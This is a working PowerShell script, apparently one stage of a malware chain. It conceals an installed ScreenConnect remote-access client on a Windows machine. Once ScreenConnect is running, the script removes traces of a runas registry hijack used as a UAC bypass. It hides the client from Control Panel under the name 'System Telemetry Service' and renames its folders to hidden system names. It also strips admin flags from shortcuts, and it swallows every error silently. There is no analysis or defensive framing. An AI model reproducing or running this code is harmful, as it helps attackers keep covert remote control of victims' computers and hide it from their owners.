Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

function Get-AppDataRoamingPath {
    $ErrorActionPreference = 'SilentlyContinue'
    $finalPath = $null
    $pathFile = "C:\Users\Public\path.txt"
    
    try {
        if (Test-Path $pathFile -ErrorAction SilentlyContinue) {
            $storedPath = Get-Content $pathFile -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($storedPath -and (Test-Path $storedPath -ErrorAction SilentlyContinue)) {
                $finalPath = $storedPath
            }
        }
    } catch { }
    
    if (-not $finalPath) {
        $candidatePaths = @{}
        
        try {
            $activeUsers = Get-WmiObject -Query "SELECT * FROM Win32_LoggedOnUser" -ErrorAction SilentlyContinue
            foreach ($user in $activeUsers) {
                try {
                    if ($user.Antecedent -match 'Domain="([^"]+)",Name="([^"]+)"') {
                        $username = $matches[2]
                        if ($username -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$') {
                            $sessions = Get-WmiObject Win32_LogonSession -Filter "LogonType = 2 OR LogonType = 10" -ErrorAction SilentlyContinue
                            foreach ($session in $sessions) {
                                try {
                                    $assoc = Get-WmiObject -Query "Associators of {Win32_LogonSession.LogonId=$($session.LogonId)} Where AssocClass=Win32_LoggedOnUser Role=Dependent" -ErrorAction SilentlyContinue
                                    if ($assoc.Name -eq $username) {
                                        $path = "C:\Users\$username\AppData\Roaming"
                                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                                            $candidatePaths[$path] = $true
                                        }
                                    }
                                } catch { }
                            }
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            $procs = Get-WmiObject Win32_Process -Filter "Name = 'explorer.exe'" -ErrorAction SilentlyContinue
            foreach ($p in $procs) {
                try {
                    $owner = $p.GetOwner()
                    if ($owner.User -and $owner.User -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE)$') {
                        $path = "C:\Users\$($owner.User)\AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            $sids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "S-1-5-21-\d+-\d+-\d+-\d+$" }
            foreach ($sid in $sids) {
                try {
                    $sidStr = $sid.PSChildName
                    $sf = "Registry::HKEY_USERS\$sidStr\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
                    $ve = "Registry::HKEY_USERS\$sidStr\Volatile Environment"
                    
                    try {
                        $shellPath = (Get-ItemProperty -Path $sf -ErrorAction SilentlyContinue).AppData
                        if ($shellPath -and (Test-Path $shellPath -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$shellPath] = $true
                        }
                    } catch { }
                    
                    try {
                        $volatilePath = (Get-ItemProperty -Path $ve -ErrorAction SilentlyContinue).APPDATA
                        if ($volatilePath -and (Test-Path $volatilePath -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$volatilePath] = $true
                        }
                    } catch { }
                } catch { }
            }
        } catch { }
        
        try {
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WTS {
    [DllImport("wtsapi32.dll", SetLastError = true)]
    public static extern bool WTSQuerySessionInformation(IntPtr hServer, int sessionId, int wtsInfoClass, out IntPtr ppBuffer, out uint pBytesReturned);
    [DllImport("wtsapi32.dll")] public static extern void WTSFreeMemory(IntPtr pMemory);
    [DllImport("kernel32.dll")] public static extern uint WTSGetActiveConsoleSessionId();
}
"@ -ErrorAction SilentlyContinue
            
            try {
                $buffer = [IntPtr]::Zero
                $sessionId = [WTS]::WTSGetActiveConsoleSessionId()
                $bytesReturned = 0
                $result = [WTS]::WTSQuerySessionInformation([IntPtr]::Zero, $sessionId, 5, [ref]$buffer, [ref]$bytesReturned)
                if ($result) {
                    $user = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($buffer)
                    [WTS]::WTSFreeMemory($buffer)
                    if ($user) {
                        $path = "C:\Users\$user\AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                }
            } catch { }
        } catch { }
        
        try {
            $profiles = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" -ErrorAction SilentlyContinue |
                        Where-Object { $_.PSChildName -match "S-1-5-21-\d+-\d+-\d+-\d+$" }
            foreach ($profile in $profiles) {
                try {
                    $localPath = (Get-ItemProperty $profile.PSPath -ErrorAction SilentlyContinue).ProfileImagePath
                    if ($localPath -and $localPath -notlike "*systemprofile*") {
                        $path = Join-Path $localPath "AppData\Roaming"
                        if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                            $candidatePaths[$path] = $true
                        }
                    }
                } catch { }
            }
        } catch { }
        
        try {
            foreach ($path in $candidatePaths.Keys) {
                $systemBinPath = Join-Path $path "SystemBin"
                if (Test-Path $systemBinPath -ErrorAction SilentlyContinue) {
                    $finalPath = $path
                    break
                }
            }
        } catch { }
        
        if (-not $finalPath -and $candidatePaths.Count -gt 0) {
            try {
                $finalPath = $candidatePaths.Keys | Select-Object -First 1
            } catch { }
        }
        
        if ($finalPath) {
            try {
                Set-Content -Path $pathFile -Value $finalPath -Force -ErrorAction SilentlyContinue
            } catch { }
        }
    }
    
    return $finalPath
}

function Start-StealthMonitor {
    $checkInterval = 20
    
    while ($true) {
        try {
            $isRunning = Test-ScreenConnectRunning
            
            if ($isRunning) {
                Reset-RunasRegistry
                Hide-ScreenConnectFromControlPanel
                Remove-ElevatedShortcuts
                Hide-ScreenConnectFolders
                return
            }
            
            Start-Sleep -Seconds $checkInterval
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

function Test-ScreenConnectRunning {
    try {
        $screenConnectPatterns = @(
            "screenconnect",
            "connectwise.control",
            "connectwise control",
            "cwcontrol",
            "f63a82ffaf9f93d1"
        )
        
        $regexPattern = $screenConnectPatterns -join "|"
        
        $activeConnections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Where-Object {
            $process = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
            if ($process) {
                ($process.Name -match $regexPattern) -or
                ($_.RemotePort -in @(8040, 8041)) -or
                ($_.LocalPort -in @(8040, 8041))
            }
        }
        
        $activeProcesses = Get-WmiObject Win32_Process -ErrorAction SilentlyContinue | Where-Object { 
            ($_.Name -match $regexPattern) -or 
            ($_.CommandLine -match $regexPattern)
        } | Where-Object {
            $_.Name -notmatch "notepad|explorer|cmd|powershell|wscript|msiexec|rundll32"
        }
        
        $runningServices = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { 
            (($_.Name -match $regexPattern) -or 
             ($_.DisplayName -match $regexPattern) -or 
             ($_.PathName -match $regexPattern)) -and
            ($_.State -eq "Running")
        }
        
        $trueCount = 0
        if ($activeConnections) { $trueCount++ }
        if ($activeProcesses) { $trueCount++ }
        if ($runningServices) { $trueCount++ }
        
        return ($trueCount -ge 2)
    }
    catch {
        return $false
    }
}

function Reset-RunasRegistry {
    try {
        # First try standard HKCU path (works when running as user)
        $hijackPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
        $defaultRunasCommand = "`"%1`" %*"
        
        if (Test-Path $hijackPath) {
            Set-ItemProperty -Path $hijackPath -Name "(Default)" -Value $defaultRunasCommand -Type String -ErrorAction SilentlyContinue
        }
        
        # If running as SYSTEM, we need to find all user hives and reset them
        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
            # Get all user profiles
            $userProfiles = Get-WmiObject Win32_UserProfile | Where-Object { $_.Special -eq $false }
            
            foreach ($profile in $userProfiles) {
                $sid = $profile.SID
                $userHijackPath = "Registry::HKEY_USERS\$sid\Software\Classes\exefile\shell\runas\command"
                
                if (Test-Path $userHijackPath) {
                    Set-ItemProperty -Path $userHijackPath -Name "(Default)" -Value $defaultRunasCommand -Type String -ErrorAction SilentlyContinue
                }
            }
            
            # Also check for currently logged-in user via explorer process
            $explorerProcesses = Get-WmiObject Win32_Process -Filter "Name = 'explorer.exe'"
            foreach ($explorer in $explorerProcesses) {
                $owner = $explorer.GetOwner()
                if ($owner.User) {
                    try {
                        $ntAccount = New-Object System.Security.Principal.NTAccount($owner.Domain, $owner.User)
                        $sid = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier]).Value
                        $userHijackPath = "Registry::HKEY_USERS\$sid\Software\Classes\exefile\shell\runas\command"
                        
                        if (Test-Path $userHijackPath) {
                            Set-ItemProperty -Path $userHijackPath -Name "(Default)" -Value $defaultRunasCommand -Type String -ErrorAction SilentlyContinue
                        }
                    } catch { }
                }
            }
        }
    }
    catch { }
}

function Hide-ScreenConnectFromControlPanel {
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
        )
        
        foreach ($path in $regPaths) {
            $programs = Get-ItemProperty $path -ErrorAction SilentlyContinue
            $screenConnectProgram = $programs | Where-Object { 
                $_.DisplayName -like "*ScreenConnect Client*" 
            }
            
            if ($screenConnectProgram) {
                $screenConnectKey = $screenConnectProgram.PSPath
                
                Set-ItemProperty -Path $screenConnectKey -Name "SystemComponent" -Value 1 -Type DWord -ErrorAction SilentlyContinue
                Set-ItemProperty -Path $screenConnectKey -Name "DisplayName" -Value "System Telemetry Service" -ErrorAction SilentlyContinue
                break
            }
        }
    }
    catch { }
}

function Remove-ElevatedShortcuts {
    try {
        # Function to remove elevation flag from a shortcut
        function Remove-ElevationFlag($path) {
            try {
                if (Test-Path $path) {
                    $bytes = [System.IO.File]::ReadAllBytes($path)
                    # Check if the file has the RunAsAdmin flag set (byte 0x15, bit 0x20)
                    if ($bytes.Length -gt 0x15 -and ($bytes[0x15] -band 0x20)) {
                        # Clear the RunAsAdmin flag
                        $bytes[0x15] = $bytes[0x15] -band 0xDF
                        [System.IO.File]::WriteAllBytes($path, $bytes)
                        return $true
                    }
                }
            } catch { }
            return $false
        }
        
        # Remove UAC Bypass registry keys
        $currentUserPath = "HKCU:\Software\Classes\exefile\shell\runas\command"
        if (Test-Path $currentUserPath) {
            # First try to reset to default value
            $defaultRunasCommand = "`"%1`" %*"
            Set-ItemProperty -Path $currentUserPath -Name "(Default)" -Value $defaultRunasCommand -Type String -ErrorAction SilentlyContinue
            # Then remove the key entirely
            Remove-Item -Path $currentUserPath -Force -ErrorAction SilentlyContinue
        }
        
        # If running as SYSTEM, handle all user hives
        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
            # Get all user SIDs from registry
            $sids = Get-ChildItem "Registry::HKEY_USERS" -ErrorAction SilentlyContinue | Where-Object { 
                $_.PSChildName -match "S-1-5-21-\d+-\d+-\d+-\d+$" 
            }
            
            foreach ($sid in $sids) {
                $userHijackPath = "Registry::HKEY_USERS\$($sid.PSChildName)\Software\Classes\exefile\shell\runas\command"
                if (Test-Path $userHijackPath) {
                    # Reset and remove
                    $defaultRunasCommand = "`"%1`" %*"
                    Set-ItemProperty -Path $userHijackPath -Name "(Default)" -Value $defaultRunasCommand -Type String -ErrorAction SilentlyContinue
                    Remove-Item -Path $userHijackPath -Force -ErrorAction SilentlyContinue
                }
            }
        }
        
        # Process Desktop shortcuts
        $desktopPaths = @()
        
        # Current user desktop
        $desktopPaths += "$env:USERPROFILE\Desktop"
        # Public desktop
        $desktopPaths += "$env:PUBLIC\Desktop"
        
        # If running as SYSTEM, get all user profiles' desktops
        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
            $userProfiles = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" -ErrorAction SilentlyContinue | 
                Where-Object { $_.PSChildName -match "S-1-5-21-\d+-\d+-\d+-\d+$" } |
                ForEach-Object { $_.ProfileImagePath }
            
            foreach ($profile in $userProfiles) {
                if (Test-Path $profile) {
                    $desktopPaths += "$profile\Desktop"
                }
            }
        }
        
        # Remove elevation from all desktop shortcuts
        foreach ($path in $desktopPaths) {
            if (Test-Path $path) {
                $shortcuts = Get-ChildItem -Path $path -Filter "*.lnk" -ErrorAction SilentlyContinue
                
                foreach ($shortcut in $shortcuts) {
                    Remove-ElevationFlag $shortcut.FullName
                }
            }
        }
        
        # Process Taskbar shortcuts
        $taskbarPaths = @()
        
        # Current user taskbar
        $taskbarPaths += "$env:APPDATA\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
        
        # If running as SYSTEM, get all user profiles' taskbars
        if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -eq "NT AUTHORITY\SYSTEM") {
            $userProfiles = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*" -ErrorAction SilentlyContinue | 
                Where-Object { $_.PSChildName -match "S-1-5-21-\d+-\d+-\d+-\d+$" } |
                ForEach-Object { $_.ProfileImagePath }
            
            foreach ($profile in $userProfiles) {
                if (Test-Path $profile) {
                    $taskbarPaths += "$profile\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
                }
            }
        }
        
        # Remove elevation from all taskbar shortcuts
        foreach ($path in $taskbarPaths) {
            if (Test-Path $path) {
                $shortcuts = Get-ChildItem -Path $path -Filter "*.lnk" -ErrorAction SilentlyContinue
                
                foreach ($shortcut in $shortcuts) {
                    Remove-ElevationFlag $shortcut.FullName
                }
            }
        }
        
    }
    catch { }
}

function Hide-ScreenConnectFolders {
    try {
        $searchPaths = @(
            "C:\Program Files\ScreenConnect Client*",
            "C:\Program Files (x86)\ScreenConnect Client*",
            "C:\Program Files\ConnectWise Control Client*",
            "C:\Program Files (x86)\ConnectWise Control Client*",
            "C:\ProgramData\ScreenConnect Client*",
            "C:\Users\*\AppData\Local\ScreenConnect Client*",
            "C:\Windows\Temp\ScreenConnect*"
        )
        
        $identifier = "f63a82ffaf9f93d1"
        
        foreach ($searchPath in $searchPaths) {
            $folders = Get-Item -Path $searchPath -ErrorAction SilentlyContinue
            
            foreach ($folder in $folders) {
                if ($folder.FullName -match $identifier -or $folder.Name -like "*ScreenConnect*") {
                    $folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                    
                    $parent = Split-Path -Parent $folder.FullName
                    $newName = ".sys_" + [guid]::NewGuid().ToString().Substring(0, 8)
                    $newPath = Join-Path -Path $parent -ChildPath $newName
                    
                    if (-not (Test-Path $newPath)) {
                        try {
                            Rename-Item -Path $folder.FullName -NewName $newName -Force
                            
                            $renamedItem = Get-Item -Path $newPath -Force
                            $renamedItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
                        }
                        catch { }
                    }
                }
            }
        }
        
        $results = Get-ChildItem -Path "C:\" -Filter "*$identifier*" -Recurse -ErrorAction SilentlyContinue -Force | Where-Object { $_.PSIsContainer }
        
        foreach ($result in $results) {
            $result.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        }
    }
    catch { }
}

Start-StealthMonitor